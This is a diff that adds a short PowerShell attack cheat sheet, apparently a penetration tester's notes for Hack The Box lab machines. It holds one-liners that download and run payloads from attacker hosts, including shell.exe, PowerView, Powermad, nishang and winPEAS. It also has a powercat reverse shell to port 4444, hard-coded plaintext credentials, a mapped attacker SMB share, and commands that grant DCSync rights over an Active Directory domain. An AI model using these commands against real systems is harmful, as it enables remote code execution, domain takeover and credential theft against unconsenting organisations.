@@ -1,0 +1,20 @@
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.20.222:8000/shell.exe' -Outfile 'c:\Windows\Temp\shell.exe'"
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.20.222:8000/winPEAS.bat' -Outfile 'c:\Windows\Temp\winPEAS.bat'"
+
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/Powermad.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/PowerView.ps1')
+START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.15:8080/shell.ps1')
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.15:8080/powercat.ps1');powercat -c 10.10.14.15 -p 4444 -e cmd"
+powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.15:8000/nishang.ps1')"
+
+$pass = convertto-securestring 'tiezzi' -AsPlainText -Force
+$cred = New-Object System.Management.automation.PSCredential('sergio', $pass)
+New-PSDrive -name mydisk -PSProvider FileSystem -Credential $cred -Root \\10.10.14.6\forest
+
+Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync
+
+$pass = convertto-securestring 'tiezzuss' -AsPlainText -Force
+$cred = New-Object System.Management.automation.PSCredential('htb\sergio', $pass)
+Add-ObjectACL -PrincipalIdentity sergio -Credential $cred -Rights DCSync
